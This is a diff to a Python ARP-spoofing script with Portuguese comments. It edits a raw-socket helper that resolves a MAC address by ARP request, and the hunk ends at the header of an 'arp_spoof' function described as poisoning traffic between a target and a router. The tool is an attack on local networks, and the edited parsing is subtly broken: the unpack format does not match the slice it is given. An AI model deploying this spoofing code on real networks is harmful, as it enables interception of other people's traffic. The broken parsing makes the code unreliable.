@@ -27,21 +27,26 @@ def criar_pacote_arp(src_mac, src_ip, dst_mac, dst_ip, opcode):
 
 def obter_mac(interface, ip):
     """Obtém o endereço MAC para um IP usando uma solicitação ARP."""
-    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
     s.bind((interface, 0))
     arp_request = criar_pacote_arp(
-        src_mac="ff:ff:ff:ff:ff:ff", src_ip="0.0.0.0", dst_mac="ff:ff:ff:ff:ff:ff", dst_ip=ip, opcode=1
+        src_mac="00:11:22:33:44:55", src_ip="0.0.0.0", 
+        dst_mac="ff:ff:ff:ff:ff:ff", dst_ip=ip, opcode=1
     )
     s.send(arp_request)
 
     while True:
         packet = s.recvfrom(65536)[0]
         eth_type = struct.unpack("!H", packet[12:14])[0]
+        
         if eth_type == 0x0806:  # ARP
-            arp_data = packet[14:28]
-            _, _, _, _, mac, ip_resp = struct.unpack("!HHBBH6s4s", arp_data)
-            if socket.inet_ntoa(ip_resp) == ip:
-                return ":".join("{:02x}".format(b) for b in mac)
+            if len(packet) >= 42:  # Verifica tamanho mínimo esperado
+                arp_data = packet[14:42]
+                _, _, _, _, mac, ip_resp = struct.unpack("!HHBBH6s4s", arp_data)
+                if socket.inet_ntoa(ip_resp) == ip:
+                    return ":".join("{:02x}".format(b) for b in mac)
+        else:
+            continue
 
 def arp_spoof(interface, alvo_ip, roteador_ip):
     """Executa ARP Spoofing entre o alvo e o roteador."""
